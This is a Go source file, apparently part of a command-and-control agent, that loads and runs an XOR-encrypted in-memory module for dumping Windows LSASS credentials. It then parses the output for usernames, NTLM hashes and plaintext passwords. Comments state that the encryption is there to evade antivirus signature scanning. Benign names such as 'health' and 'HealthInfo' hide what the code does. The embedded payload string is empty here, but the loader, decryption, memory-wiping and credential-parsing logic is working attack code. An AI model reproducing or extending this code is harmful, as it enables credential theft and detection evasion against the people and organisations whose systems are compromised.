//go:build windows && amd64

package health

import (
	"encoding/hex"
	"fmt"

	"github.com/aegis-c2/aegis/agent/bof"
)

// lsassBOFHex is the XOR-encrypted COFF object (hex-encoded).
// Key: [0xA5, 0x3C, 0x7F, 0x12, 0xE8, 0x9B, 0x44, 0xD6]
// Compiled from agent/bof/lsass_dump.c via MinGW.
// Encryption prevents static signature scanning of COFF strings.
const lsassBOFHex = ""

// lsassKey is the XOR decryption key.
var lsassKey = [8]byte{0xA5, 0x3C, 0x7F, 0x12, 0xE8, 0x9B, 0x44, 0xD6}

// xorDecrypt decrypts data in-place using the repeating key.
func xorDecrypt(data []byte) {
	for i := range data {
		data[i] ^= lsassKey[i%len(lsassKey)]
	}
}

// ExtractFromLSASS loads, decrypts, and executes the embedded LSASS credential extraction BOF.
// The BOF is XOR-encrypted at rest to prevent static signature scanning.
// At runtime: hex decode → XOR decrypt → execute in memory → zero out.
func ExtractFromLSASS() (*HealthResult, error) {
	result := &HealthResult{
		Credentials: make([]HealthInfo, 0),
	}

	encoded, err := hex.DecodeString(lsassBOFHex)
	if err != nil {
		result.Error = fmt.Sprintf("decode BOF hex: %v", err)
		return result, err
	}

	// Decrypt XOR in-place
	xorDecrypt(encoded)

	// Ensure memory is cleared on return
	defer func() {
		for i := range encoded {
			encoded[i] = 0
		}
	}()

	stdout, stderr, err := bof.ExecuteBOF(encoded, "go", nil, nil)
	if err != nil {
		result.Error = fmt.Sprintf("execute BOF: %v", err)
		return result, err
	}

	output := string(stdout)
	if len(stderr) > 0 {
		output += "\n[stderr] " + string(stderr)
	}

	creds := parseBOFOutput(output)
	result.Credentials = creds
	return result, nil
}

// parseBOFOutput parses BOF stdout for credential patterns.
func parseBOFOutput(output string) []HealthInfo {
	var creds []HealthInfo
	for i := 0; i < len(output); i++ {
		if output[i] == '+' && i+1 < len(output) && output[i+1] == ']' {
			end := i
			for end < len(output) && output[end] != '\n' {
				end++
			}
			line := output[i:end]
			cred := parseCredLine(line)
			if cred.Username != "" {
				creds = append(creds, cred)
			}
			i = end
		}
	}
	return creds
}

func parseCredLine(line string) HealthInfo {
	cred := HealthInfo{SourceType: "lsass"}

	ntlmIdx := findStr(line, "NTLM:")
	if ntlmIdx == -1 {
		return cred
	}

	start := 2
	if start >= ntlmIdx {
		start = 0
	}
	username := trimSpace(line[start:ntlmIdx])
	cred.Username = username

	hashStart := ntlmIdx + 5
	if hashStart+32 <= len(line) {
		cred.NTLMHash = trimSpace(line[hashStart : hashStart+32])
	}

	pwdIdx := findStr(line, "PWD:")
	if pwdIdx != -1 {
		cred.Password = trimSpace(line[pwdIdx+4:])
	}

	return cred
}

func findStr(s, sub string) int {
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return i
		}
	}
	return -1
}

func trimSpace(s string) string {
	start := 0
	for start < len(s) && (s[start] == ' ' || s[start] == '\t') {
		start++
	}
	end := len(s)
	for end > start && (s[end-1] == ' ' || s[end-1] == '\t' || s[end-1] == '\n' || s[end-1] == '\r') {
		end--
	}
	return s[start:end]
}
